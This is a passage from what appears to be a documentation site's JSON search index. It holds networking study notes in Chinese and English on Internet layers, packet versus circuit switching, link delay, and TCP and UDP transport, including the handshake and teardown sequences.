\u82e5\u76ee\u6807IP\u4e0d\u5728\u672c\u5730\u7f51\u7edc\uff0c\u53d1\u9001\u5230\u9ed8\u8ba4\u7f51\u5173\uff08\u5982<code>192.168.1.1</code>\uff09\u3002 3. ARP\u89e3\u6790MAC\u5730\u5740\uff1a\u4e3b\u673aA\u901a\u8fc7ARP\u83b7\u53d6\u7f51\u5173\u7684MAC\u5730\u5740\u3002 4. \u9010\u8df3\u8f6c\u53d1\uff1a\u8def\u7531\u5668\u6839\u636e\u8def\u7531\u8868\u5c06\u6570\u636e\u5305\u4f20\u9012\u5230\u76ee\u6807\u7f51\u7edc\u3002 5. \u89e3\u5c01\u88c5\uff1a\u670d\u52a1\u5668B\u63a5\u6536IP\u6570\u636e\u62a5\uff0c\u63d0\u53d6\u4e0a\u5c42\uff08TCP/HTTP\uff09\u6570\u636e\u3002  </p>"},{"location":"web/internet/#_5","title":"\u516d\u3001\u5173\u952e\u95ee\u9898\u4e0e\u89e3\u51b3\u65b9\u6848","text":"\u95ee\u9898 \u89e3\u51b3\u65b9\u6848 IP\u5730\u5740\u4e0d\u8db3 IPv6\u3001NAT\uff08\u7f51\u7edc\u5730\u5740\u8f6c\u6362\uff09\u3001CIDR\uff08\u65e0\u7c7b\u57df\u95f4\u8def\u7531\uff09\u3002 \u5206\u7247\u4e0e\u91cd\u7ec4 IP\u6570\u636e\u62a5\u5206\u7247\uff08\u9002\u5e94\u4e0d\u540cMTU\uff09\uff0c\u76ee\u6807\u4e3b\u673a\u91cd\u7ec4\u3002 \u8def\u7531\u73af\u8def TTL\u5b57\u6bb5\u3001\u8def\u7531\u534f\u8bae\u73af\u8def\u907f\u514d\u673a\u5236\uff08\u5982OSPF\u7684SPF\u7b97\u6cd5\uff09\u3002 \u5f02\u6784\u7f51\u7edc\u4e92\u8054 IP\u534f\u8bae\u7edf\u4e00\u7f16\u5740\uff0c\u8def\u7531\u5668\u5b9e\u73b0\u534f\u8bae\u8f6c\u6362\u3002"},{"location":"web/internet/#vs","title":"\u4e03\u3001\u7f51\u7edc\u5c42 vs \u5176\u4ed6\u5c42","text":"\u5c42\u7ea7 \u6838\u5fc3\u4efb\u52a1 \u5178\u578b\u8bbe\u5907 \u6570\u636e\u94fe\u8def\u5c42 \u540c\u4e00\u94fe\u8def\u5185\u5e27\u4f20\u8f93\uff08MAC\u5730\u5740\uff09 \u4ea4\u6362\u673a\u3001\u7f51\u6865 \u7f51\u7edc\u5c42 \u8de8\u7f51\u7edc\u6570\u636e\u5305\u8def\u7531\uff08IP\u5730\u5740\uff09 \u8def\u7531\u5668 \u4f20\u8f93\u5c42 \u7aef\u5230\u7aef\u53ef\u9760\u4f20\u8f93\uff08TCP/UDP\u7aef\u53e3\uff09 \u9632\u706b\u5899\u3001NAT\u8bbe\u5907"},{"location":"web/internet/#_6","title":"\u516b\u3001\u603b\u7ed3","text":"<p>\u7f51\u7edc\u5c42\u662f\u4e92\u8054\u7f51\u7684\u201c\u4ea4\u901a\u67a2\u7ebd\u201d\uff0c\u901a\u8fc7IP\u5bfb\u5740\u548c\u8def\u7531\u9009\u62e9\u5b9e\u73b0\u5168\u7403\u4e92\u8054\u3002\u5176\u6838\u5fc3\u4ef7\u503c\u5728\u4e8e\uff1a 1. \u5c4f\u853d\u5e95\u5c42\u5dee\u5f02\uff08\u5982\u4ee5\u592a\u7f51\u3001Wi-Fi\uff09\uff0c\u5b9e\u73b0\u65e0\u7f1d\u901a\u4fe1\u3002 2. \u52a8\u6001\u9002\u5e94\u7f51\u7edc\u53d8\u5316\uff08\u5982\u94fe\u8def\u6545\u969c\u3001\u62d3\u6251\u8c03\u6574\uff09\u3002 3. \u6269\u5c55\u6027\uff08IPv6\u3001SDN\u7b49\u6280\u672f\u7684\u6f14\u8fdb\uff09\u3002  </p> <p>\u7406\u89e3\u7f51\u7edc\u5c42\u662f\u638c\u63e1\u4e92\u8054\u7f51\u5de5\u4f5c\u539f\u7406\u7684\u57fa\u7840\uff0c\u4e5f\u662f\u8bbe\u8ba1\u9ad8\u6548\u3001\u53ef\u9760\u7f51\u7edc\u67b6\u6784\u7684\u5173\u952e\u3002</p>"},{"location":"web/intro/","title":"Introduction","text":""},{"location":"web/intro/#layers_of_internet","title":"Layers of Internet","text":""},{"location":"web/intro/#layer_1_physical_layer","title":"Layer 1: Physical Layer","text":"<p>In the Internet, we\u2019re looking for a way to signal bits (1s and 0s) across space.  The technology could be voltages on an electrical wire, wireless radio waves, light pulses along optical fiber cables, among others.</p>"},{"location":"web/intro/#layer_2_link_layer","title":"Layer 2: Link Layer","text":"<p>In the Internet, a link connects two machines. That link could be using any sort of technology (wired, wireless, optical fiber, etc.). If we use links to connect up a bunch of nearby computers, we get a local area network (LAN).</p> <p>At Layer 2, we can also group bits into units of data called packets (or frames at this layer), and define where a packet starts and ends in the physical signal. We can also handle problems like multiple people simultaneously using the same wire to send data.</p>"},{"location":"web/intro/#layer_3_internet_layer","title":"Layer 3: Internet Layer","text":"<p>In the Internet, the post office receiving and redirecting mail is called a switch or router.</p> <p>If we build additional links between switches, we can connect up local networks. </p> <p>With enough links and local networks, we can connect everybody in the world, resulting in the Internet.</p> <p>On the Internet, the operators are Internet service providers, who own and operate Internet structure.</p>"},{"location":"web/intro/#network_of_networks","title":"Network of Networks","text":"<p> In the Internet, end hosts are machines (e.g. servers, laptops, phones) communicating over the Internet. By contrast, a switch (also called a router) is a machine that isn\u2019t sending or receiving its own data, but exists to help the end hosts communicate with each other. </p>"},{"location":"web/intro/#best-effort_service_model","title":"Best-Effort Service Model","text":"<p>service model: a contract between the network and users, describing what the network does and doesn\u2019t support. The designers of the Internet didn\u2019t support any of those models. Instead, the Internet only supports best effort delivery of data. If you send data over Layer 3, the Internet will try its best to deliver it, but there is no guarantee that the data will be delivered. The Internet also won\u2019t tell you whether or not the delivery succeeded.</p>"},{"location":"web/intro/#packets_abstraction","title":"Packets Abstraction","text":"<p>Packets are limited in size. If the application has some large data to send (e.g. a video), we need to somehow split up that data into packets, and send each packet through the network independently.</p>"},{"location":"web/intro/#layer_4_transport","title":"Layer 4: Transport","text":"<p>This layer uses Layer 3 as a building block, and implements an additional protocol for  - re-sending lost packets,  - splitting data into packets, and  - reordering packets that arrive out-of-order (among other features).</p> <p>The transport layer protocol allows us to stop thinking in terms of packets, and start thinking in terms of flows, streams of packets that are exchanged between two endpoints.</p>"},{"location":"web/intro/#layer_7_application","title":"Layer 7: Application","text":"<p>The Internet\u2019s design allows it to be a general-purpose communication network for any type of application data.</p> <p>Each layer relies on services from the layer directly below, and provides services to the layer directly above. Two layers interact directly through the interface between them.</p>"},{"location":"web/intro/#headers","title":"Headers","text":"<p>Just like the envelope, when we send a packet, we need to attach additional metadata that tells the network infrastructure what to do with that packet. This additional metadata is called a header. The rest of the bits (e.g. the file being sent, the letter inside the envelope) is called the payload.</p> <ul> <li> <p>The network infrastructure should only read the header to decide how to deliver the data.</p> </li> <li> <p>The application at the end host cares about the payload, not the header. That said, the end hosts still need to know about headers, in order to add headers to packets before sending them.</p> </li> </ul>"},{"location":"web/intro/#headers_are_standardized","title":"Headers are Standardized","text":"<p>Everybody on the Internet (every end host, every switch) needs to agree on the format of a header.</p>"},{"location":"web/intro/#what_should_a_header_contain","title":"What Should a Header Contain?","text":"<ul> <li>destination address, definitely</li> </ul> <p>other information that\u2019s not required, but is useful to have: - the source address</p> <ul> <li> <p>checksum, to ensure that packet is not corrupted while in transit</p> </li> <li> <p>other metadata like the length of the packet</p> </li> </ul>"},{"location":"web/intro/#multiple_headers","title":"Multiple Headers","text":"<p> Note that some layers offer multiple choices of protocol (e.g. wireless or wired protocols at Layer 2). In these cases, the two people communicating need to use the same choice of protocol. A wired sender can\u2019t talk to a wireless recipient.</p>"},{"location":"web/intro/#addressing_and_naming","title":"Addressing and Naming","text":"<p>Different layers in the Internet have different addressing schemes that work best for that particular layer.</p> <ul> <li>Sometimes a host is referred to by its human-readable name (e.g. www.google.com). </li> <li>Other times, that same host is referred to by a machine-readable IP address (e.g. 74.124.56.2), where this number somehow encodes something about the server\u2019s location (and could change if the server moves). </li> <li>Other times, that same host could be referred to by its hardware MAC address, which never changes.</li> </ul>"},{"location":"web/intro/#layers_at_hosts_and_routers","title":"Layers at Hosts and Routers","text":""},{"location":"web/intro/#layers","title":"Layers","text":"<ul> <li>The end hosts need to implement all the layers.</li> <li>The router does need Layer 1 for receiving bits on a wire, Layer 2 for sending packets along the wire, and Layer 3 for forwarding packets in the global network.</li> </ul>"},{"location":"web/intro/#multiple_headers_1","title":"Multiple Headers","text":"<p>First, Host A takes the message and works its way down the stack, adding headers for Layer 7, 4, 3, 2, and 1.  </p> <p>The router reads and unwraps the Layer 1 and Layer 2 headers, revealing the Layer 3 header underneath. The router reads this header to decide where to forward the packet next. </p> <p>Now, to pass the packet along to the next hop, the router must go down the stack again, wrapping new Layer 2 and Layer 1 headers, and then sending the bits along the wire to the next hop. </p> <p>This pattern repeats at every router</p> <p>Eventually, the packet reaches Host B, who unwraps every layer, one by one: Layer 1, 2, 3, 4, 7. Host B has successfully received the message! </p> <p>In summary: Each router parses Layers 1 through 3, while the end hosts parse Layers 1 through 7. </p>"},{"location":"web/intro/#consequence","title":"Consequence","text":"<p>One consequence of this layering scheme is that each hop can use different protocols at Layer 2 and 1. More generally, we said that each layer only needs to communicate with its peers at the same layer.  - The host\u2019s peer is the other host. - The router\u2019s peers are its neighboring routers along the path.</p>"},{"location":"web/intro/#network_architecture","title":"Network Architecture","text":"<p>The term socket refers to an OS mechanism for connecting an application to the networking stack in the OS.  When an application opens a socket, that socket is associated with a logical port number. When the OS receives a packet, it uses the port number to direct that packet to the associated socket.</p>"},{"location":"web/intro/#designing_resource_sharing","title":"Designing Resource Sharing","text":""},{"location":"web/intro/#statistical_multiplexing","title":"Statistical Multiplexing","text":"<p>The Internet needs to support many simultaneous flows at the same time, despite limited capacity.</p> <p>We often say that the network resources are statistically multiplexed, which means that we\u2019ll dynamically allocate resources to users based on their demand, instead of partitioning a fixed share of resources to users.</p> <p></p> <p>The premise that makes statistical multiplexing work is: In practice, the peak of aggregate demand is much less than the aggregate of peak demands.</p> <p> </p> <p>Peaks could still happen at the same time, which would cause packets to be delayed or dropped (recall the link queue).  Nevertheless, we made the design choice to statistically multiplex and use resources more efficiently, while dealing with the consequences (occasional simultaneous peaks).</p>"},{"location":"web/intro/#circuit_switching_vs_packet_switching","title":"Circuit Switching vs. Packet Switching","text":"<p>How do we actually dynamically allocate resources between users?</p>"},{"location":"web/intro/#packet_switching","title":"Packet Switching","text":"<p>One approach is best-effort. </p> <p>Everybody sends their data into the network and hopes for the best. There\u2019s no guarantee that there will be enough bandwidth to meet your demand. The switch looks at each packet independently and forwards the packet closer to its destination.  The switches are also independent from each other. As a packet hops across switches, every switch considers the packet independently.</p>"},{"location":"web/intro/#circuit_switching","title":"Circuit Switching","text":"<p>The other approach is based on </p> <p>At the start of a flow, the end hosts identify a path (sequence of switches and links) through the network, using some routing algorithm.  Then, the source sends a special reservation request message to the destination. Along the way, every switch hears about this request as well. If every switch accepts the request, then the reservation is made, and a circuit of switches has been established between the source and destination. </p> <p>Once the reservation is confirmed by every switch, data can be sent. Eventually, when the flow ends, the source sends a teardown message to the recipient. Along the way, every switch sees this message and releases its capacity. </p> <p>Remember, both circuit switching and packet switching are embodying statistical multiplexing.  The main difference is the granularity at which we\u2019re allocating resources: per-flow with reservations, or per-packet with best-effort.  Even in circuit switching, we\u2019re dynamically allocating resources based on reservations. We are not preemptively reserving for all flows that might ever exist.</p> <p></p>"},{"location":"web/intro/#trade-offs","title":"Trade-offs","text":"<p>Circuit switching gives the application better performance with reserved bandwidth. It also gives the developer more predictable behavior.</p> <p>However, packet switching gives us more efficient sharing of bandwidth, and avoids startup time. It also gives us easier recovery from failure, and is generally simpler to implement (less for routers to think about).</p>"},{"location":"web/intro/#in_practice","title":"In Practice","text":"<p>In the modern Internet, packet switching is the default approach.</p>"},{"location":"web/intro/#link","title":"Link","text":""},{"location":"web/intro/#properties_of_links","title":"Properties of Links","text":"<p>The bandwidth of a link tells us how many bits we can send on the link per unit time.  Intuitively, this is the speed of the link.  We usually measure bandwidth in bits per second (e.g. 5 Gbps = 5 billion bits per second).</p> <p>The propagation delay of a link tells us how long it takes for a bit to travel along the link.  Propagation delay is measured in time (e.g. nanoseconds, milliseconds). -- In the context of a link, the latency is its propagation delay, though this word can also be used in other contexts</p> <p>If we multiply the bandwidth and the propagation delay, we get the bandwidth-delay product (BDP).  Intuitively, this is the capacity of the link, or the number of bits that exist on the link at any given instant. </p> <p>pipe analogy: </p>"},{"location":"web/intro/#packet_delay","title":"Packet Delay","text":"<p>The transmission delay tells us how long it takes to put the bits on the wire.  In general, this is the packet size divided by the link bandwidth.</p> <p>The packet delay is the time it takes for an entire packet to be sent, starting from the time the first bit is put on the wire, to the time the last bit is received at the other end.  This delay is the sum of the transmission delay and the propagation delay.</p>"},{"location":"web/intro/#overloaded_links","title":"Overloaded Links","text":""},{"location":"web/intro/#transient_overload","title":"Transient Overload","text":"<p>In the long term, we have enough capacity to send all the outgoing packets, but at this very instant in time, we have two packets arriving simultaneously, and we can only send out one.</p> <p></p> <p>To cope with transient overload, the switch maintains a queue of packets. If two packets arrive simultaneously, the switch queues one of them and sends out the other one. At any given time, the switch could choose to send a packet from one of the incoming links, or send a packet from the queue. This choice is determined by a packet scheduling algorithm.</p>"},{"location":"web/intro/#persistent_overload","title":"Persistent Overload","text":"<p>There just isn\u2019t enough capacity on the outgoing link to support the level of incoming traffic.</p> <p></p> <p>We could fill the queue up, but that still isn\u2019t enough to support the incoming load. One way or another, the switch will drop packets. One possible solution to overload is to have the router tell the senders to slow down.</p>"},{"location":"web/transform/","title":"Transform","text":""},{"location":"web/transform/#transport_layer","title":"\u4f20\u8f93\u5c42\uff08Transport Layer\uff09\u8be6\u89e3","text":"<p>\u4f20\u8f93\u5c42\u662fOSI\u6a21\u578b\u7684\u7b2c\u56db\u5c42\uff08TCP/IP\u6a21\u578b\u7684\u540c\u540d\u5c42\uff09\uff0c\u6838\u5fc3\u4efb\u52a1\u662f\u63d0\u4f9b\u7aef\u5230\u7aef\uff08End-to-End\uff09\u7684\u6570\u636e\u4f20\u8f93\u670d\u52a1\uff0c\u786e\u4fdd\u6570\u636e\u5728\u6e90\u4e3b\u673a\u548c\u76ee\u6807\u4e3b\u673a\u4e4b\u95f4\u53ef\u9760\u6216\u9ad8\u6548\u5730\u4f20\u9012\u3002\u4ee5\u4e0b\u662f\u7cfb\u7edf\u5316\u7684\u89e3\u6790\uff1a</p>"},{"location":"web/transform/#_1","title":"\u4e00\u3001\u4f20\u8f93\u5c42\u7684\u6838\u5fc3\u529f\u80fd","text":"\u529f\u80fd \u8bf4\u660e \u8fdb\u7a0b\u95f4\u901a\u4fe1 \u901a\u8fc7\u7aef\u53e3\u53f7\u6807\u8bc6\u5e94\u7528\u8fdb\u7a0b\uff08\u5982HTTP=80\uff0cSSH=22\uff09\u3002 \u53ef\u9760\u4f20\u8f93 \u63d0\u4f9b\u6570\u636e\u786e\u8ba4\u3001\u91cd\u4f20\u3001\u6392\u5e8f\u7b49\u673a\u5236\uff08\u5982TCP\uff09\u3002 \u6d41\u91cf\u63a7\u5236 \u901a\u8fc7\u6ed1\u52a8\u7a97\u53e3\u673a\u5236\u907f\u514d\u53d1\u9001\u65b9\u6df9\u6ca1\u63a5\u6536\u65b9\uff08TCP\u7279\u6709\uff09\u3002 \u62e5\u585e\u63a7\u5236 \u52a8\u6001\u8c03\u6574\u53d1\u9001\u901f\u7387\u4ee5\u907f\u514d\u7f51\u7edc\u8fc7\u8f7d\uff08\u5982TCP\u7684\u6162\u542f\u52a8\u3001\u62e5\u585e\u907f\u514d\uff09\u3002 \u591a\u8def\u590d\u7528/\u89e3\u590d\u7528 \u591a\u4e2a\u5e94\u7528\u5171\u4eab\u540c\u4e00\u7f51\u7edc\u8fde\u63a5\uff08\u5982\u6d4f\u89c8\u5668\u540c\u65f6\u4e0b\u8f7d\u56fe\u7247\u548c\u6587\u672c\uff09\u3002"},{"location":"web/transform/#_2","title":"\u4e8c\u3001\u6838\u5fc3\u534f\u8bae","text":""},{"location":"web/transform/#1_tcp","title":"1. TCP\uff08\u4f20\u8f93\u63a7\u5236\u534f\u8bae\uff09","text":"<ul> <li>\u7279\u70b9\uff1a  </li> <li>\u9762\u5411\u8fde\u63a5\uff08\u9700\u4e09\u6b21\u63e1\u624b\u5efa\u7acb\u8fde\u63a5\uff09\u3002 </li> <li>\u4e00\u5bf9\u4e00 </li> <li>\u53ef\u9760\u4f20\u8f93\uff08\u786e\u8ba4\u3001\u91cd\u4f20\u3001\u6570\u636e\u6392\u5e8f\uff09\u3002  </li> <li>\u9762\u5411\u5b57\u8282\u6d41</li> <li>\u6d41\u91cf\u63a7\u5236\u548c\u62e5\u585e\u63a7\u5236\u3002  </li> <li>\u9002\u7528\u573a\u666f\uff1aWeb\u6d4f\u89c8\uff08HTTP\uff09\u3001\u6587\u4ef6\u4f20\u8f93\uff08FTP\uff09\u3001\u7535\u5b50\u90ae\u4ef6\uff08SMTP\uff09\u7b49\u9700\u53ef\u9760\u6027\u7684\u670d\u52a1\u3002</li> </ul>"},{"location":"web/transform/#2_udp","title":"2. UDP\uff08\u7528\u6237\u6570\u636e\u62a5\u534f\u8bae\uff09","text":"<ul> <li>\u7279\u70b9\uff1a  </li> <li>\u65e0\u8fde\u63a5\uff08\u76f4\u63a5\u53d1\u9001\u6570\u636e\uff0c\u65e0\u9700\u63e1\u624b\uff09\u3002  </li> <li>\u4e00\u5bf9\u591a\uff0c\u591a\u5bf9\u4e00\uff0c\u591a\u5bf9\u591a</li> <li>\u4e0d\u53ef\u9760\u4f20\u8f93\uff08\u4e0d\u4fdd\u8bc1\u6570\u636e\u5230\u8fbe\u6216\u987a\u5e8f\uff09\u3002</li> <li>\u9762\u5411\u62a5\u6587</li> <li>\u4f4e\u5ef6\u8fdf\u3001\u5f00\u9500\u5c0f\u3002 </li> <li>\u9002\u7528\u573a\u666f\uff1a\u89c6\u9891\u6d41\uff08\u5982Zoom\uff09\u3001\u5728\u7ebf\u6e38\u620f\u3001DNS\u67e5\u8be2\u7b49\u5b9e\u65f6\u6027\u8981\u6c42\u9ad8\u7684\u670d\u52a1\u3002</li> </ul>"},{"location":"web/transform/#3","title":"3. \u5176\u4ed6\u534f\u8bae","text":"<ul> <li>SCTP\uff1a\u7ed3\u5408TCP\u548cUDP\u7279\u6027\uff0c\u652f\u6301\u591a\u5bbf\u4e3b\uff08Multi-homing\uff09\u548c\u6d88\u606f\u8fb9\u754c\uff08\u7528\u4e8eVoIP\uff09\u3002  </li> <li>QUIC\uff1a\u57fa\u4e8eUDP\u7684\u73b0\u4ee3\u534f\u8bae\uff08HTTP/3\u4f7f\u7528\uff09\uff0c\u89e3\u51b3TCP\u7684\u961f\u5934\u963b\u585e\u95ee\u9898\u3002</li> </ul>"},{"location":"web/transform/#_3","title":"\u4e09\u3001\u5173\u952e\u6982\u5ff5\u4e0e\u6280\u672f","text":""},{"location":"web/transform/#1_port","title":"1. \u7aef\u53e3\u53f7\uff08Port\uff09","text":"<ul> <li>\u4f5c\u7528\uff1a\u6807\u8bc6\u4e3b\u673a\u4e0a\u7684\u5177\u4f53\u5e94\u7528\u8fdb\u7a0b\uff08\u8303\u56f4\uff1a0~65535\uff09\u3002  </li> <li>\u5206\u7c7b\uff1a  </li> <li>\u77e5\u540d\u7aef\u53e3\uff080~1023\uff09\uff1a\u5982HTTP=80\u3001HTTPS=443\u3001SSH=22\u3002  </li> <li>\u6ce8\u518c\u7aef\u53e3\uff081024~49151\uff09\uff1a\u5982MySQL=3306\u3002  </li> <li>\u52a8\u6001\u7aef\u53e3\uff0849152~65535\uff09\uff1a\u5ba2\u6237\u7aef\u4e34\u65f6\u4f7f\u7528\u3002  </li> </ul>"},{"location":"web/transform/#2_tcp","title":"2. TCP\u8fde\u63a5\u7ba1\u7406","text":"<ul> <li>\u4e09\u6b21\u63e1\u624b\uff1a</li> <li>SYN: \u540c\u6b65\u4f4d</li> <li>ACK: \u786e\u8ba4\u4f4d</li> <li>seq: \u5e8f\u5217\u53f7 (\u5e8f\u53f7)</li> <li>ack: \u786e\u8ba4\u53f7 (\u671f\u671b\u4e0b\u4e00\u4e2a\u5e8f\u53f7)   <pre><code>1. \u5ba2\u6237\u7aef \u2192 SYN = 1, seq = x \u2192 \u670d\u52a1\u7aef  \n2. \u670d\u52a1\u7aef \u2192 SYN = 1, ACK = 1, ack = x + 1, seq = y \u2192 \u5ba2\u6237\u7aef  \n3. \u5ba2\u6237\u7aef \u2192 ACK = 1, seq = x + 1, ack = y + 1 \u2192 \u670d\u52a1\u7aef  \n</code></pre></li> <li>\u56db\u6b21\u6325\u624b\uff1a  </li> <li>FIN: \u7ec8\u6b62\u4f4d   <pre><code>1. \u5ba2\u6237\u7aef \u2192 FIN = 1, seq = u \u2192 \u670d\u52a1\u7aef  \n2. \u670d\u52a1\u7aef \u2192 ACK = 1, seq = v, ack = u + 1 \u2192 \u5ba2\u6237\u7aef  \n3. \u670d\u52a1\u7aef \u2192 FIN = 1, ACK = 1, seq = w, ack = u + 1 \u2192 \u5ba2\u6237\u7aef  \n4. \u5ba2\u6237\u7aef \u2192 ACK = 1, seq = u + 1, ack = w + 1 \u2192 \u670d\u52a1\u7aef  \n</code></pre></li> </ul>"},{"location":"web/transform/#3_tcp","title":"3. \u53ef\u9760\u4f20\u8f93\u673a\u5236\uff08TCP\uff09","text":"<ul> <li>\u5e8f\u5217\u53f7\u4e0e\u786e\u8ba4\u53f7\uff1a\u6bcf\u4e2a\u5b57\u8282\u6570\u636e\u90fd\u6709\u552f\u4e00\u5e8f\u5217\u53f7\uff0c\u63a5\u6536\u65b9\u901a\u8fc7ACK\u786e\u8ba4\u3002  </li> <li>\u8d85\u65f6\u91cd\u4f20\uff1a\u672a\u6536\u5230ACK\u65f6\u91cd\u53d1\u6570\u636e\u3002  </li> <li>\u6ed1\u52a8\u7a97\u53e3\uff1a\u52a8\u6001\u8c03\u6574\u53d1\u9001\u7a97\u53e3\u5927\u5c0f\u4ee5\u5339\u914d\u63a5\u6536\u65b9\u5904\u7406\u80fd\u529b\u3002</li> </ul>"},{"location":"web/transform/#4_udp","title":"4. UDP\u7684\u8f7b\u91cf\u7ea7\u8bbe\u8ba1","text":"<ul> <li>\u65e0\u8fde\u63a5\uff1a\u76f4\u63a5\u53d1\u9001\u6570\u636e\u62a5\uff0c\u65e0\u9700\u7ef4\u62a4\u8fde\u63a5\u72b6\u6001\u3002  </li> <li>\u6821\u9a8c\u548c\u53ef\u9009\uff1a\u4ec5\u63d0\u4f9b\u57fa\u672c\u9519\u8bef\u68c0\u6d4b\uff08\u4e0d\u4fdd\u8bc1\u7ea0\u6b63\uff09\u3002  </li> </ul>"},{"location":"web/transform/#tcp_vs_udp","title":"\u56db\u3001TCP vs UDP\u5bf9\u6bd4","text":"\u7279\u6027 TCP UDP \u8fde\u63a5\u65b9\u5f0f \u9762\u5411\u8fde\u63a5\uff08\u4e09\u6b21\u63e1\u624b\uff09 \u65e0\u8fde\u63a5 \u53ef\u9760\u6027 \u53ef\u9760\uff08\u786e\u8ba4\u3001\u91cd\u4f20\u3001\u6392\u5e8f\uff09 \u4e0d\u53ef\u9760 \u6d41\u91cf\u63a7\u5236 \u652f\u6301\uff08\u6ed1\u52a8\u7a97\u53e3\uff09 \u4e0d\u652f\u6301 \u62e5\u585e\u63a7\u5236 \u652f\u6301\uff08\u6162\u542f\u52a8\u3001\u62e5\u585e\u907f\u514d\uff09 \u4e0d\u652f\u6301 \u5934\u90e8\u5f00\u9500 \u8f83\u5927\uff0820~60\u5b57\u8282\uff09 \u8f83\u5c0f\uff088\u5b57\u8282\uff09 \u5ef6\u8fdf \u8f83\u9ad8\uff08\u9700\u63e1\u624b\u3001\u786e\u8ba4\uff09 \u6781\u4f4e \u9002\u7528\u573a\u666f \u6587\u4ef6\u4f20\u8f93\u3001\u7f51\u9875\u6d4f\u89c8 \u89c6\u9891\u4f1a\u8bae\u3001\u5b9e\u65f6\u6e38\u620f\u3001DNS"},{"location":"web/transform/#_4","title":"\u4e94\u3001\u4f20\u8f93\u5c42\u4e0e\u4e0b\u5c42\u7684\u5173\u7cfb","text":""},{"location":"web/transform/#1_ip","title":"1. \u4f9d\u8d56\u7f51\u7edc\u5c42\uff08IP\u5c42\uff09","text":"<ul> <li>IP\u5730\u5740\uff1a\u5b9a\u4f4d\u76ee\u6807\u4e3b\u673a\uff08\u5982<code>192.168.1.1</code>\uff09\u3002  </li> <li>\u4f20\u8f93\u5c42\u7aef\u53e3\uff1a\u5b9a\u4f4d\u4e3b\u673a\u4e0a\u7684\u5177\u4f53\u670d\u52a1\uff08\u5982<code>80</code>\u7aef\u53e3\u5bf9\u5e94Web\u670d\u52a1\u5668\uff09\u3002  </li> </ul>"},{"location":"web/transform/#2","title":"2. \u4e0e\u94fe\u8def\u5c42\u7684\u533a\u522b","text":"\u4f20\u8f93\u5c42 \u94fe\u8def\u5c42 \u7aef\u5230\u7aef\u901a\u4fe1\uff08\u8de8\u7f51\u7edc\uff09 \u70b9\u5bf9\u70b9\u901a\u4fe1\uff08\u540c\u4e00\u94fe\u8def\u5185\uff09 \u4f7f\u7528\u7aef\u53e3\u53f7\u6807\u8bc6\u8fdb\u7a0b \u4f7f\u7528MAC\u5730\u5740\u6807\u8bc6\u8bbe\u5907 \u89e3\u51b3\u53ef\u9760\u6027\u3001\u6d41\u91cf\u63a7\u5236\u95ee\u9898 \u89e3\u51b3\u5e27\u4f20\u8f93\u3001\u9519\u8bef\u68c0\u6d4b\u95ee\u9898"},{"location":"web/transform/#_5","title":"\u516d\u3001\u5b9e\u9645\u5e94\u7528\u793a\u4f8b","text":""},{"location":"web/transform/#1tcp","title":"\u573a\u666f1\uff1a\u7f51\u9875\u52a0\u8f7d\uff08TCP\uff09","text":"<ol> <li>\u6d4f\u89c8\u5668\uff08\u7aef\u53e3<code>54321</code>\uff09\u5411\u670d\u52a1\u5668\uff08\u7aef\u53e3<code>80</code>\uff09\u53d1\u8d77TCP\u8fde\u63a5\uff08\u4e09\u6b21\u63e1\u624b\uff09\u3002  </li> <li>\u53d1\u9001HTTP\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u8fd4\u56deHTML\u6587\u4ef6\uff08\u901a\u8fc7TCP\u786e\u8ba4\u673a\u5236\u4fdd\u8bc1\u6570\u636e\u5b8c\u6574\uff09\u3002  </li> <li>\u4f20\u8f93\u5b8c\u6210\u540e\u56db\u6b21\u6325\u624b\u91ca\u653e\u8fde\u63a5\u3002</li> </ol>"},{"location":"web/transform/#2udp","title":"\u573a\u666f2\uff1a\u89c6\u9891\u901a\u8bdd\uff08UDP\uff09","text":"<ol> <li>\u5ba2\u6237\u7aef\u76f4\u63a5\u53d1\u9001\u89c6\u9891\u6570\u636e\u5305\u5230\u670d\u52a1\u5668\uff08\u65e0\u8fde\u63a5\u5efa\u7acb\uff09\u3002  </li> <li>\u4e22\u5305\u65f6\u4e0d\u91cd\u4f20\uff0c\u7ee7\u7eed\u53d1\u9001\u540e\u7eed\u5e27\uff08\u907f\u514d\u5ef6\u8fdf\u7d2f\u79ef\uff09\u3002  </li> <li>\u63a5\u6536\u65b9\u901a\u8fc7\u7f13\u51b2\u548c\u63d2\u503c\u8865\u507f\u4e22\u5931\u7684\u5e27\u3002</li> </ol>"},{"location":"web/transform/#_6","title":"\u4e03\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"web/transform/#q1tcp","title":"Q1\uff1a\u4e3a\u4ec0\u4e48TCP\u63e1\u624b\u662f\u4e09\u6b21\uff0c\u6325\u624b\u662f\u56db\u6b21\uff1f","text":"<ul> <li>\u63e1\u624b\uff1a\u7b2c\u4e09\u6b21\u63e1\u624b\u53ef\u643a\u5e26\u6570\u636e\uff08\u63d0\u9ad8\u6548\u7387\uff09\uff0c\u4e14\u907f\u514d\u5386\u53f2\u8fde\u63a5\u5e72\u6270\u3002  </li> <li>\u6325\u624b\uff1a\u56e0TCP\u5168\u53cc\u5de5\uff0c\u9700\u5206\u522b\u5173\u95ed\u4e24\u4e2a\u65b9\u5411\u7684\u8fde\u63a5\u3002</li> </ul>"},{"location":"web/transform/#q2","title":"Q2\uff1a\u7aef\u53e3\u53f7\u662f\u552f\u4e00\u7684\u5417\uff1f","text":"<ul> <li>\u540c\u4e00\u4e3b\u673a\u5185\uff1a\u540c\u4e00\u65f6\u523b\u7684\u7aef\u53e3\u53f7\u4e0d\u80fd\u91cd\u590d\u4f7f\u7528\u3002  </li> <li>\u4e0d\u540c\u4e3b\u673a\uff1a\u53ef\u4ee5\u76f8\u540c\uff08\u5982\u4e24\u53f0\u7535\u8111\u5747\u53ef\u4f7f\u7528<code>54321</code>\u7aef\u53e3\u8bbf\u95eeWeb\uff09\u3002</li> </ul>"},{"location":"web/transform/#q3tcpudp","title":"Q3\uff1a\u5982\u4f55\u9009\u62e9TCP\u6216UDP\uff1f","text":"<ul> <li>\u9009TCP\uff1a\u9700\u53ef\u9760\u6027\uff08\u5982\u6587\u4ef6\u4e0b\u8f7d\u3001\u6570\u636e\u5e93\u540c\u6b65\uff09\u3002  </li> <li>\u9009UDP\uff1a\u9700\u4f4e\u5ef6\u8fdf\u6216\u5bb9\u5fcd\u4e22\u5305\uff08\u5982\u76f4\u64ad\u3001\u6e38\u620f\uff09\u3002  </li> 